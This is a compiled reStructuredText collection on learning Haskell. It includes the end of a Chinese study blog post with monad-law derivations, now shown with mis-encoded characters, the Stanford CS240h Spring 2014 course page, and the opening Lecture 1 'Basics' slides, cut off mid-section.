         .. container:: float highlight haskell
         ::

              (m >>= f) >>= g 
            = (join (fmap f m)) >>= g = join (fmap g (join (fmap f m)))
            = join . fmap g . join $ fmap f m 
            = join . join . fmap (fmap g) $ fmap f m 
            = join . join . fmap (fmap g) . fmap f $ m 
            = join . join . fmap (fmap g . f) $ m 
            = join . fmap join . fmap (fmap g . f) $ m 
            = join . fmap (join . (fmap g . f)) $ m 
            = join . fmap (\x -> join (fmap g (f x))) $ m 
            = join . fmap (\x -> f x >>= g) $ m 
            = join (fmap (\x -> f x >>= g) m)
            = m >>= (\x -> f x >>= g)

      ÊúâÂÖ≥doËØ≠Âè•Âíå ``>=>`` ÁöÑÂÖ¨ÁêÜË°®Ëø∞Âú®‰∏äÊñá‰∏≠Â∑≤ÁªèËØ¥Ëøá

   .. rubric:: ` <#ÂêéËÆ∞>`__ ÂêéËÆ∞
      :name: ÂêéËÆ∞

      ÂïÉ‰∫ÜÂ∞ÜËøë‰∏Ä‰∏™ÊúàÔºåÁÆóÊòØÊää Haskell ÁöÑ‰∏ªË¶ÅÂÜÖÂÆπÈÉΩÂïÉÂÆå‰∫Ü„ÄÇ‰∏ªË¶ÅÂ∞±ÊòØÂâçÊúüÁúã
      `Learn You a Haskell <http://learnyouahaskell.com/chapters>`__Ôºå
      ÂêéÊúüÁúã `Typeclassopedia <https://wiki.haskell.org/Typeclassopedia>`__„ÄÇ

      ÂêéÈù¢ÁöÑÈÉ®ÂàÜÁöÑÁêÜËß£ÊÑüËßâ‰πüÊ≤°Âà∞‰ΩçÔºåCategoryÔºàËåÉÁï¥Ôºâ„ÄÅArrow Á≠âËøô‰∫õÁ±ªÂûãÁ±ª‰πüÂ∞±ÊòØÂ§ßËá¥Âú∞Áúã‰∫Ü‰∏ÄÁúºÔºå
      ÁîöËá≥Êúâ‰ªÄ‰πàÁî®ÈÉΩ‰∏çÂ§™Ê∏ÖÊ•ö\_(:–∑„Äç‚à†)\_

      ÊÑüËßâ Haskell ËøôÈó®ËØ≠Ë®ÄÁ°ÆÂÆûÂæàÁ•ûÂ•áÔºåÂæàÂ§öËØ≠Ê≥ïÈÉΩÂæàÊúâÊÑèÊÄùÔºåËÄå‰∏îÂèØ‰ª•ÂÅöÂà∞ÈùûÂ∏∏Ë¥¥ËøëÊï∞Â≠¶„ÄÅË¥¥ËøëÊï∞Â≠¶Ê¶ÇÂøµ„ÄÇ
      Â≠¶ÁöÑÊó∂ÂÄô‰πüÊòØË∂äÂ≠¶ÂùëË∂äÂ§öÔºåÂÖàÊòØÂáΩÊï∞ÂºèÁºñÁ®ãÂºïÁî≥Âà∞‰∫ÜlambdaÊºîÁÆóÔºåÁÑ∂ÂêéÊòØÂáΩÂ≠êÁ≠â‰∏ÄÁ≥ªÂàóÊ¶ÇÂøµÂºïÁî≥Âà∞‰∫ÜËåÉÁï¥ËÆ∫Ôºå
      ÁõÆÂâçËåÉÁï¥ËÆ∫ÁÆÄÂçïÂú∞Áúã‰∫Ü‰∏ÄÈÉ®ÂàÜÔºålambdaÊºîÁÆó‰πüÊ≤°Ê∑±ÂÖ•Á†îÁ©∂Ôºå‰ª•ÂêéÊúâÊó∂Èó¥ÂÜçËØ¥‰∫ÜÔºàÂíïÂíïÂíïÔºâ

      Áé∞Âú®ÊÑüËßâÊàëÂ≠¶Âà∞ÁöÑ Haskell ÁÆÄÁõ¥ÊòØÁöÆÊØõÔºåËøòÊúâ‰∏ÄÂ†ÜÊ∫êÁ†ÅÈáåÁöÑ‰∏úË•ø‰∏çÁü•ÈÅìÊòØÊÄé‰πàÂõû‰∫ãÔºàÂåÖÊã¨‰ΩÜ‰∏çÈôê‰∫é#Ôºå~ÔºâÔºå
      ‰πüËøòÊúâ‰∏ÄÂ†ÜÁ±ªÂûãÁ±ªÂíåÁî®Ê≥ïÊ≤°ÊúâÂ≠¶Âà∞ÔºàÂåÖÊã¨‰ΩÜ‰∏çÈôê‰∫é Monad
      Transformer„ÄÅWriter„ÄÅReader„ÄÅState„ÄÅComonad„ÄÅMonadFix„ÄÅLens„ÄÅParsec„ÄÅ‚Ä¶‚Ä¶Ôºâ
      [STRIKEOUT:mdÔºåËøô‰πà‰∏ÄÁúãÂ∑ÆÁöÑËøòÁúüÂ§ö]Ôºå‰ª•ÂêéÊúâÊó∂Èó¥ÂÜçÊÖ¢ÊÖ¢Â≠¶‰∫ÜÔºåËøô‰∏™ÂÅáÊúüËøòÊúâÂ•ΩÂ§öÂÖ∂ÂÆÉ‰∫ãË¶ÅÂπ≤Âë¢Ôºå
      HaskellËøôËæπÂÖàÊë∏‰∫Ü\_(:–∑„Äç‚à†)\_


   .. rubric:: ` <#Reference>`__ Reference
      :name: Reference

      -  `Learn You a Haskell <http://learnyouahaskell.com/chapters>`__
      -  `Writing foldl using foldr - StackOverflow <https://stackoverflow.com/questions/6172004/writing-foldl-using-foldr>`__
      -  `HaskellÔºöÁî®foldrÂÆö‰πâfoldl <https://blog.csdn.net/WinterShiver/article/details/103308165>`__
      -  `Typeclassopedia - Haskell wiki <https://wiki.haskell.org/Typeclassopedia>`__
      -  `Hoogle <https://hoogle.haskell.org/>`__
      -  `Functors, Applicatives, And Monads In Pictures <https://adit.io/posts/2013-04-17-functors,_applicatives,_and_monads_in_pictures.html>`__
      -  `HaskellÂ≠¶‰π† - functor <http://02s949.coding-pages.com/2018/08/15/haskellc/>`__
      -  `HaskellËØ≠Ë®ÄÂ≠¶‰π†Á¨îËÆ∞Ôºà8ÔºâMonoid - zwvista <https://blog.csdn.net/zwvista/article/details/54863519>`__
      -  `HaskellËØ≠Ë®ÄÂ≠¶‰π†Á¨îËÆ∞Ôºà16ÔºâAlternative - zwvista <https://blog.csdn.net/zwvista/article/details/62238541>`__
      -  `HaskellËØ≠Ë®ÄÂ≠¶‰π†Á¨îËÆ∞Ôºà40ÔºâArrowÔºà1Ôºâ - zwvista <https://blog.csdn.net/zwvista/article/details/78679542>`__
      -  `24 Days of GHC Extensions: Arrows - Tom Ellis <https://ocharles.org.uk/blog/guest-posts/2014-12-21-arrows.html>`__
      -  `HaskellËØ≠Ë®ÄÂ≠¶‰π†Á¨îËÆ∞Ôºà47ÔºâArrowÔºà2Ôºâ - zwvista <https://blog.csdn.net/zwvista/article/details/78690485>`__
      -  `Haskell/Category theory - wikibooks <https://en.wikibooks.org/wiki/Haskell/Category_theory>`__
      -  `Category theory - wikipedia <https://en.wikipedia.org/wiki/Category_theory>`__
      -  `ËåÉÁï¥ËÆ∫ - Áª¥Âü∫ÁôæÁßë <https://zh.wikipedia.org/wiki/%E8%8C%83%E7%95%B4%E8%AE%BA>`__
      -  `Monad (category theory) - wikipedia <https://en.wikipedia.org/wiki/Monad_(category_theory)>`__
      -  `Functor - wikipedia <https://en.wikipedia.org/wiki/Functor>`__

      "The End?"



===================================================
/. üöÄ CS240h: Functional Systems in Haskell
===================================================
- https://www.scs.stanford.edu/14sp-cs240h/

.. container:: row col-md-12

   .. rubric:: CS240h: Functional Systems in Haskell |CS240h|
      :name: title
      :class: text-hide text-center

   .. rubric:: Stanford CS240h Spring 2014
      :name: stanford-cs240h-spring-2014
      :class: lead text-center

If you have enrolled in the class or plan to, please install the
`Haskell Platform <http://hackage.haskell.org/platform/>`__ on your
machine so as to be able to do the assignments, and bring your laptop to
class.

.. container:: row col-md-12 alert alert-warning

   Final project presentations took place Thursday, June 5, 12pm-4pm in
   Gates 104. Lunch was served.

   Final project write-ups are available `here <projects/index.html>`__.

.. container:: row col-md-12 alert alert-warning

   If you are scribing a lecture, please see the 
   `scribe repo <https://github.com/scslab/cs240h-notes>`__ for information on
   how to prepare and submit the notes.

   Last day to submit scribe notes: June 14.

.. container:: row

   .. container:: col-md-4 col-md-offset-1

      .. container:: panel-heading

         Course Material

      .. container:: panel-body

         *  `Syllabus <https://www.scs.stanford.edu/14sp-cs240h/sched/>`__
         *  `Lecture slides <https://www.scs.stanford.edu/14sp-cs240h/slides/>`__
         *  `Scribed lecture notes <https://www.scs.stanford.edu/14sp-cs240h/notes/>`__
         *  `Lab 1 <https://www.scs.stanford.edu/14sp-cs240h/labs/lab1.html>`__
         *  `Lab 2 <https://www.scs.stanford.edu/14sp-cs240h/labs/lab2.html>`__
         *  `Lab 3 <https://www.scs.stanford.edu/14sp-cs240h/labs/lab3.html>`__
         *  `Project suggestions <https://www.scs.stanford.edu/14sp-cs240h/labs/project.html>`__

      .. container:: section panel panel-info

         .. container:: panel-heading

            Grading

         .. container:: panel-body

            **Grading:** Lab 1 (10%), Lab 2 (10%), Lab 3 (15%), Project
            (65%). **Late Days:** Each student gets 48 hours of
            extension to the lab deadlines that can be used in 24 hour
            blocks. They are used automatically. **Late Penalty:** Each
            day late (after late days exhausted) will reduce your
            maximum mark for the lab or project by 25%.

   .. container:: col-md-6

      .. container:: section panel panel-info

         .. container:: panel-heading

            Meetings

         .. container:: panel-body

            **Lecture:** Tuesdays and Thursdays, 12:50-2:05pm,
            `Gates <http://campus-map.stanford.edu/index.cfm?ID=07-450>`__
            B-12

      .. container:: section panel panel-info

         .. container:: panel-heading

            Resources

         .. container:: panel-body

            **Discussion forums:**
            `Piazza <https://piazza.com/stanford/spring2014/cs240h>`__
            **Class list:** cs240h-spr1314-students@lists.stanford.edu
            **Staff list:** |staff email| **Lab submission:** 
            `cs240h lab submission <http://upload.ghc.io>`__ **Recommended
            background:** `Real World Haskell <http://book.realworldhaskell.org/>`__, 
            by O'Sullivan, Stewart, and Goerzen.

            For help, please post on Piazza as then the whole class can
            benefit from your question. However, you can also email the
            class mailing list or staff mailing list if you prefer not
            to use Piazza

      .. container:: section panel panel-info

         .. container:: panel-heading

            Staff

         .. container:: panel-body

            .. container:: row

               **Instructor:** `David Mazi√®res <http://www.scs.stanford.edu/~dm/>`__
               **Office hours:** Thursdays 2:05-3:05pm **Address:**
               Gates, Room 290 **Phone:** (415) 490-9451
               **Instructor:** `Bryan O'Sullivan <http://www.serpentine.com/>`__ **Office
               hours:** Tuesdays 2:05-3:00pm
               **Address:** Gates Hall, Room 288 **Email:**
               bos@serpentine.com
               **TA:** `David Terei <http://www.scs.stanford.edu/~davidt/>`__ **Office
               hours:** Monday 2:00-4:00pm **Address:** Gates, Room 288
               **Phone:** (415) 359-5494


CS240h lecture notes
=============================

#. `Basics <https://www.scs.stanford.edu/14sp-cs240h/slides/basics.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/basics-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/basics.md>`__]
#. Slides from previous lecture include this lecture
#. `Testing <https://www.scs.stanford.edu/14sp-cs240h/slides/testing.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/testing-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/testing.md>`__]
#. `Concurrency <https://www.scs.stanford.edu/14sp-cs240h/slides/concurrency.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/concurrency-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/concurrency.md>`__]
#. `Phantoms <https://www.scs.stanford.edu/14sp-cs240h/slides/phantoms.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/phantoms-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/phantoms.md>`__]
#. `Memory <https://www.scs.stanford.edu/14sp-cs240h/slides/memory.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/memory-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/memory.md>`__]
#. `Language extensions <https://www.scs.stanford.edu/14sp-cs240h/slides/extensions.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/extensions-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/extensions.md>`__]
#. `Generic programming <https://www.scs.stanford.edu/14sp-cs240h/slides/generic.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/generic-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/generic.md>`__]
#. `Monads and more <https://www.scs.stanford.edu/14sp-cs240h/slides/functors-monads.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/functors-monads-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/functors-monads.md>`__]
#. `Pipes <https://www.scs.stanford.edu/14sp-cs240h/slides/pipes.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/pipes-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/pipes.md>`__]
#. `Parsing and monads <https://www.scs.stanford.edu/14sp-cs240h/slides/parsing.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/parsing-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/parsing.md>`__]
#. `Information flow control <https://www.scs.stanford.edu/14sp-cs240h/slides/ifc.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/ifc-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/ifc.md>`__]
#. `Lenses <https://www.scs.stanford.edu/14sp-cs240h/slides/lenses.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/lenses-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/lenses.md>`__]
#. `Web <https://www.scs.stanford.edu/14sp-cs240h/slides/web.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/web-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/web.md>`__]
#. `Haskell Compiler (compiler) <https://www.scs.stanford.edu/14sp-cs240h/slides/ghc-compiler.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/ghc-compiler-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/ghc-compiler.md>`__]
#. `Haskell Compiler (rts) <https://www.scs.stanford.edu/14sp-cs240h/slides/ghc-rts.pdf>`__

These slides were formatted using 
`pandoc <http://johnmacfarlane.net/pandoc/>`__. To install pandoc, run:

   ::

      cabal install pandoc -fhighlighting-kate

Slides were prepared with 

   ``pandoc slidy-url=`` *slidy-dir* ``--self-contained -s -t slidy -o``
   *outfile infile*

with this contents in `slidy-dir <slidy.tgz>`__ (we just modified
`slidy.css <slidy.css>`__ slightly).

--------------

.. container::

   Permission hereby granted for anyone to copy, modify, and
   redistribute any lecture note material from this class that belongs
   to the instructors or Stanford.

/L1 Basics
==========

CS240h: Functional systems in Haskell 

-  I‚Äôm David Mazi√®res

   -  Spent most of my career working on OSes, Systems, and Security
   -  Previously used C++ and C, but started using Haskell 5 years ago
   -  Course partly inspired by my experience learning Haskell

-  Other instructor: Bryan O‚ÄôSullivan

   -  Has implemented many key Haskell libraries in widespread use today
   -  Co-wrote `Real World Haskell <http://book.realworldhaskell.org/>`__, a great
      non-theoretical intro book
   -  Also plenty of systems experience (e.g., Linux early userspace code)

-  Course assistant: David Terei

   -  Member of the Haskell standards committee!
   -  Implemented `Safe Haskell <http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html>`__
      and GHC LLVM backend

Why Haskell?
============

-  Haskell‚Äôs expressive power can improve productivity

   -  Small language core provides big flexibility
   -  Code can be very concise, speeding development
   -  Get best of both worlds from compiled and interpreted languages

-  Haskell makes code easier to understand and maintain

   -  Can dive into complex libraries and understand *what* the code is
      doing (*why* may be a different story, but conciseness leaves room
      for comments‚Ä¶)

-  Haskell can increase the robustness of systems

   -  Strong typing catches many bugs at compile time
   -  Functional code permits better testing methodologies
   -  Can parallelize non-concurrent code without changing semantics
   -  Concurrent programming abstractions resistant to data races

-  Haskell lets you realize new types of functionality (DIFC, STM, ‚Ä¶)

Why take CS240h?
================

-  Learn to build systems in Haskell with reduced upfront cost

   -  Historically, Haskell was a vehicle for language research. The
      history is reflected in how the language is usually taught
   -  CS240h will present the language more from a systems perspective

-  Learn new, surprising, and effective programming techniques

   -  Some are applicable to other languages (though returning to other
      languages after Haskell can be frustrating)

-  **You enjoy programming**

   -  With Haskell, you will think about programming in new ways

-  You sometimes get frustrated with other languages

   -  Maybe you‚Äôve wanted to design a new language, or tend to ‚Äúmax-out‚Äù
      existing language features (macros, templates, overloading, etc.)
   -  Things that require changes to most languages can be done in a
      library with Haskell

Administrivia
=============

-  We assume some of you may have toyed with Haskell, others not
-  First week cover Haskell basics

   -  If you haven‚Äôt used Haskell, you should supplement by reading
      parts of `Bryan‚Äôs book <http://book.realworldhaskell.org/>`__
      and/or on-line tutorials (such as http://www.haskell.org/tutorial/
      or http://learnyouahaskell.com/chapters).
   -  If you have used Haskell, you may still learn some things from
      these lectures

-  Rest of term covers more advanced techniques
-  Final grade will be based on several factors

   1. Class attendance and participation **‚Äì bring your laptop to class**
   2. Scribing one of the lectures **‚Äì need a volunteer for today**

      -  We plan to collect all the notes and distribute them freely on web

   3. Three small warm-up solo programming exercises
   4. A large final project & presentation

Final project
=============

-  Implement a project of your choice in Haskell

   -  Projects may be done in teams of 1-3 people
   -  Meet with one of the instructors to discuss project
   -  Complete and evaluate project and turn in short paper
   -  Final exam will be mini-conference where you present your work
   -  **Attending exam Tuesday, June 10th, 7:00pm-10:00pm is
      mandatory**  But by unanimous consent we could move this to
      Thursday June 5, 12:15-3:15pm. (And we would serve lunch‚Ä¶)

.. raw:: html

   <!--
   * Class home page has list of
     [suggested projects](http://cs240h.scs.stanford.edu/labs/project.html)
     (we will add more)
   -->

-  We encourage overlap of CS240h project with your research

   -  The programming techniques you learn in CS240h are likely
      orthogonal to whatever research you are doing

-  We are okay with CS240h project also serving as another class
   project, **provided the other instructor and all teammates (from
   both classes) approve**

Getting started with Haskell
============================

-  Install `Haskell Platform <http://hackage.haskell.org/platform/>`__
   or ```cabal`` <http://www.haskell.org/cabal/users-guide/>`__
   (sometimes ``cabal-install``) +
   `GHC <http://www.haskell.org/ghc/docs/latest/html/users_guide/index.html>`__

-  Create a file called ``hello.hs`` with the following contents:

   .. code:: haskell

      main = putStrLn "Hello, world!"

-  Compile your program to a native executable like this:

   ::

      $ ghc --make hello
      [1 of 1] Compiling Main             ( hello.hs, hello.o )
      Linking hello ...
      $ ./hello
      Hello, world!

-  Or run it in the `GHCI interpreter <http://www.haskell.org/ghc/docs/latest/html/users_guide/ghci.html>`__
   like this:

   ::

      $ ghci hello.hs 
      GHCi, version 7.6.3: http://www.haskell.org/ghc/  :? for help
      ...
      Ok, modules loaded: Main.
      *Main> main
      Hello, world!
      *Main> 

Bindings
========

-  Haskell uses the ``=`` sign to declare *bindings*:

   .. code:: haskell

      x = 2                   -- Two hyphens introduce a comment
      y = 3                   --    ...that continues to end of line.
      main = let z = x + y    -- let introduces local bindings
             in print z       -- program will print 5

   -  Bound names cannot start with upper-case letters
   -  Bindings are separated by ‚Äú``;``‚Äù, which is usually auto-inserted
      by a
      `layout <http://www.haskell.org/onlinereport/haskell2010/haskellch2.html#x7-210002.7>`__
      rule

-  A binding may declare a *function* of one or more arguments

   -  Function and arguments are separated by spaces (when defining or
      invoking)

   .. code:: haskell

      add arg1 arg2 = arg1 + arg2   -- defines function add
      five = add 2 3                -- invokes function add

-  Parentheses can wrap compound expressions, must do so for arguments

   .. code:: haskell

      bad = print add 2 3     -- error! (print should have only 1 argument)

   .. code:: haskell

      main = print (add 2 3)  -- ok, calls print with 1 argument, 5

Haskell is a *pure* functional language
=======================================

-  Unlike variables in imperative languages, Haskell bindings are

   -  *immutable* - can only bind a symbol once in a give scope (bound
      symbols still called ‚Äúvariables‚Äù since function arguments can vary
      across invocations)

   .. code:: haskell

      x = 5
      x = 6                      -- error, cannot re-bind x

   -  *order-independent* - order of bindings in source code does not
      matter
   -  *lazy* - definitions of symbols are evaluated only when needed

   .. code:: haskell

      safeDiv x y =
          let q = div x y        -- safe as q never evaluated if y == 0
          in if y == 0 then 0 else q
      main = print (safeDiv 1 0) -- prints 0

   -  *recursive* - the bound symbol is in scope within its own
      definition

   .. code:: haskell

      x = 5                 -- this x is not used in main

      main = let x = x + 1  -- introduces new x, defined in terms of itself
             in print x     -- program "diverges" (i.e., loops forever)

How to program without mutable variables?
=========================================

-  In C, we use mutable variables to create loops:

   .. code:: C

      long
      factorial (int n)
      {
        long result = 1;
        while (n > 1)
          result *= n--;
        return result;
      }

-  In Haskell, use recursion to ‚Äúre-bind‚Äù argument symbols in new scope

   .. code:: haskell

      factorial n = if n > 1
                    then n * factorial (n-1)
                    else 1

   -  Recursion often fills a similar need to mutable variables
   -  But the above Haskell factorial is inferior to the C one‚Äìwhy?

Tail recursion
==============

-  Each recursive call may require a stack frame

   -  This Haskell code requires ``n`` stack frames

      .. code:: haskell

         factorial n = if n > 1 then n * factorial (n-1) else 1

   -  By contrast, our C factorial ran in constant space

-  Fortunately, Haskell supports optimized *tail recursion*

   -  A function is tail recursive if it ends with a call to itself
   -  Unfortunately, ``factorial n`` multiplies by ``n`` *after*
      evaluating ``factorial (n-1)``

-  Idea: use *accumulator* argument to make calls tail recursive

   .. code:: haskell

      factorial n = let loop acc n' = if n' > 1
                                      then loop (acc * n') (n' - 1)
                                      else acc
                    in loop 1 n

   -  Here ``loop`` is tail recursive, compiles to an actual loop

Guards and ``where`` clauses
============================

-  *Guards* let you shorten function declarations:

   .. code:: haskell

      factorial n = let loop acc n' | n' > 1 = loop (acc * n') (n' - 1)
                                    | otherwise = acc
                    in loop 1 n

   -  ‚Äú``|``‚Äù symbol introduces a guard
   -  Guards are evaluated top to bottom; the first ``True`` guard wins
   -  The system Prelude (standard library) defines ``otherwise = True``

-  Bindings can also end with ``where`` clauses‚Äìlike inverted ``let``

   .. code:: haskell

      factorial n = loop 1 n
          where loop acc n' | n' > 1    = loop (acc * n') (n' - 1)
                            | otherwise = acc

   -  Unlike ``let``, a ``where`` clause scopes over multiple guarded
      definitions
   -  This is convenient for binding variables to use in guards

Tip: variable names
===================

-  Inner functions (``loop``) often have arguments related to outer
   function

   -  It is legal to re-use variable names already in scope, but
      compiler will warn you
   -  Typical practice is to add ``'`` (prime) to the inner-function‚Äôs
      argument
   -  Haskell accepts the ``'`` character in variables, except as first
      character

-  Personally, I find this practice a bit error-prone

   -  While learning Haskell, I repeatedly made the error of dropping
      primes, e.g.:

   .. code:: haskell

      factorial n = loop 1 n
          where loop acc n' | n' > 1    = loop (acc * n) (n' - 1) -- bug
                            | otherwise = acc

   -  You can avoid the problem by using the longer symbol name for the
      outer function (i.e., shorter name for shorter scope)

   .. code:: haskell

      factorial n0 = loop 1 n0
          where loop acc n | n > 1     = loop (acc * n) (n - 1)
                           | otherwise = acc

   -  Here accidentally typing ‚Äú``factorial n0 = loop 1 n``‚Äù causes
      compile error

Every expression and binding has a type
=======================================

-  Some basic types:

   -  ``Bool`` - either ``True`` or ``False``
   -  ``Char`` - a unicode code point (i.e., a character)
   -  ``Int`` - fixed-size integer
   -  ``Integer`` - an arbitrary-size integer
   -  ``Double`` - an IEEE double-precision floating-point number
   -  *type1* ``->`` *type2* - a function from *type1* to *type2*
   -  ``(`` *type1* ``,`` *type2* ``,`` ‚Ä¶ ``,`` *typeN* ``)`` - a
      tuple
   -  ``()`` - a zero-tuple, pronounced *unit* (kind of like ``void`` in
      C); there is only one value of this type, also written ``()``

-  You can declare the type of a symbol or expression with ``::``

   .. code:: haskell

      x :: Integer
      x = (1 :: Integer) + (1 :: Integer) :: Integer

   -  ``::`` has lower precedence than any function operators (including
      ``+``)

More on types
=============

-  Function application happens one argument at a time (a.k.a. ‚Äú*currying*‚Äù)

   .. code:: haskell

      add :: Integer -> (Integer -> Integer)
      add arg1 arg2 = arg1 + arg2

   -  So ``add 2 3`` is equivalent to ``(add 2) 3``
   -  ``(add 2)`` takes 3 returns 5, so
      ``(add 2) has type Integer -> Integer``
   -  ``->`` associates to the right, so parens usually omitted in
      multi-argument function types: ``fn ::`` *argType1* ``->``
      *argType2* ``->`` ‚Ä¶ ``->`` *argTypeN* ``->`` *resultType*

-  Usually the compiler can infer types

   -  You can ask
      `GHCI <http://www.haskell.org/ghc/docs/latest/html/users_guide/ghci.html>`__
      to show you inferred types with ``:t``

   ::

      *Main> :t add
      add :: Integer -> Integer -> Integer

   -  Good practice to declare types of top-level bindings anyway
      (compiler warns if missing)

User-defined data types
=======================

-  The ``data`` keyword declares user-defined data types (like
   ``struct`` in C):

   .. code:: haskell

      data PointT = PointC Double Double deriving Show

   -  Declares new type, ``PointT`` with constructor ``PointC``
      containing two ``Double`` s
   -  ``deriving Show`` means you can print the type (helpful in GHCI)
   -  Can also derive ``Read``, ``Eq``, ``Ord``, ``Enum``, ``Bounded``

-  Note that data types and constructors *must* start with capital
   letters

-  Types and constructors can use the same name (often do), E.g.:

   .. code:: haskell

      data Point = Point Double Double deriving Show

-  One type can have multiple constructors (like a tagged union):

   .. code:: haskell

      data Point = Cartesian Double Double
                 | Polar Double Double
                   deriving Show

   .. code:: haskell

      data Color = Red | Green | Blue | Violet deriving (Show, Eq, Enum)

Using data types
================

-  Constructors act like functions producing values of their types

   .. code:: haskell

      data Point = Point Double Double deriving Show
      myPoint :: Point
      myPoint = Point 1.0 1.0

   .. code:: haskell

      data Color = Red | Green | Blue | Violet deriving (Show, Eq, Enum)
      myColor :: Color
      myColor = Red

-  ``case`` statements & function bindings ‚Äúde-construct‚Äù values with
   *patterns*

   .. code:: haskell

      getX, getMaxCoord :: Point -> Double
      getX point = case point of
                     Point x y -> x
      getMaxCoord (Point x y) | x > y     = x
                              | otherwise = y

   .. code:: haskell

      isRed :: Color -> Bool
      isRed Red = True        -- Only matches constructor Red
      isRed c   = False       -- Lower-case c just a variable

Exercise: Rock, Paper, Scissors referee
=======================================

-  Given the following types for a rock-paper-scissors game:

   .. code:: haskell

      data Move = Rock | Paper | Scissors
           deriving (Eq, Read, Show, Enum, Bounded)

      data Outcome = Lose | Tie | Win deriving (Show, Eq, Ord)

-  Define a function ``outcome :: Move -> Move -> Outcome``

   -  The first move should be your own, the second your opponent‚Äôs
   -  Should tell you if you won, lost, or tied

::

   GHCi, version 7.6.3: http://www.haskell.org/ghc/  :? for help
   ...
   *Main> outcome Rock Paper
   Lose
   *Main> outcome Scissors Paper
   Win
   *Main> outcome Paper Paper
   Tie

Answer
======

.. code:: haskell

   data Move = Rock | Paper | Scissors deriving (Eq, Read, Show, Enum, Bounded)

   data Outcome = Lose | Tie | Win deriving (Show, Eq, Ord)

   -- | @outcome our_move their_move@
   outcome :: Move -> Move -> Outcome
   outcome Rock Scissors        = Win
   outcome Paper Rock           = Win
   outcome Scissors Paper       = Win
   outcome us them | us == them = Tie
                   | otherwise  = Lose

Parameterized types
===================

-  Types can have parameters sort of the way functions do

   -  Type parameters start with lower-case letters
   -  Some examples from the standard Prelude

   .. code:: haskell

      data Maybe a = Just a
                   | Nothing

   .. code:: haskell

      data Either a b = Left a
                      | Right b

-  You can see these at work in GHCI:

   ::

      Prelude> :t Just True
      Just True :: Maybe Bool
      Prelude> :t Left True
      Left True :: Either Bool b   

-  Notice the type of ``Left True`` contains a type variable, ``b``

   -  Expression ``Left True`` can be of type ``Either Bool b`` for any
      type ``b``
   -  This is an example of a feature called *parametric polymorphism*

More deconstruction tips
========================

-  Special variable ‚Äú``_``‚Äù can be bound but not used

   -  Use it when you don‚Äôt care about a value:

   .. code:: haskell

      isJust :: Maybe a -> Bool    -- note parametric polymorphism
      isJust (Just _) = True
      isJust Nothing  = False

   .. code:: haskell

      isRed Red = True
      isRed _   = False            -- we don't need the non-red value

   -  Compiler warns if a bound variable not used; ``_`` avoids this

-  You can deconstruct types and bind variables within guards, E.g.:

   .. code:: haskell

      addMaybes mx my | Just x <- mx, Just y <- my = Just (x + y)
      addMaybes _ _                                = Nothing

   though often there is a simpler way

   .. code:: haskell

      addMaybes (Just x) (Just y) = Just (x + y)
      addMaybes _ _               = Nothing

Lists
=====

-  We could define homogeneous lists with the ``data`` keyword

   .. code:: haskell

      data List a = Cons a (List a) | Nil

      oneTwoThree = (Cons 1 (Cons 2 (Cons 3 Nil))) :: List Integer

-  But Haskell has built-in lists with syntactic sugar

   -  Instead of ``List Integer``, the type is written ``[Integer]``
   -  Instead of ``Cons``, the constructor is called ``:`` and is
      *infix*
   -  Instead of ``Nil``, the empty list is called ``[]``

   .. code:: haskell

      oneTwoThree = 1:2:3:[] :: [Integer]

   -  But there are even more convenient syntaxes for the same list:

   .. code:: haskell

      oneTwoThree' = [1, 2, 3]  -- comma-separated elements within brackets
      oneTwoThree'' = [1..3]    -- define list by a range

-  A ``String`` is just a list of ``Char``, so
   ``['a', 'b', 'c'] == "abc"``

-  You can pattern match on literal lists and ``String`` s

Some basic list functions in Prelude
====================================

.. code:: haskell

   head :: [a] -> a
   head (x:_) = x
   head []    = error "head: empty list"

.. code:: haskell

   tail :: [a] -> [a]           -- all but first element
   tail (_:xs) = xs
   tail []     = error "tail: empty list"

.. code:: haskell

   a ++ b :: [a] -> [a] -> [a]  -- infix operator concatenate lists
   [] ++ ys     = ys
   (x:xs) ++ ys = x : xs ++ ys

.. code:: haskell

   length :: [a] -> Int         -- This code is from language spec
   length []    =  0            -- GHC implements differently, why?
   length (_:l) =  1 + length l

.. code:: haskell

   filter :: (a -> Bool) -> [a] -> [a]
   filter pred [] = []
   filter pred (x:xs)
     | pred x     = x : filter pred xs
     | otherwise  = filter pred xs

Note function ``error :: String -> a`` reports assertion failures

Parsing with ``deriving Read`` and ``reads``
============================================

-  We‚Äôve been using ‚Äú``deriving Show``‚Äù and ``show`` to print values

   -  By default ``show`` show gives you a valid Haskell expression

   ::

      *Main> show $ Point 1.0 1.0
      "Point 1.0 1.0"               <-- could paste string into your source

-  ‚Äú``deriving Read``‚Äù lets you parse a value at run time

   .. code:: haskell

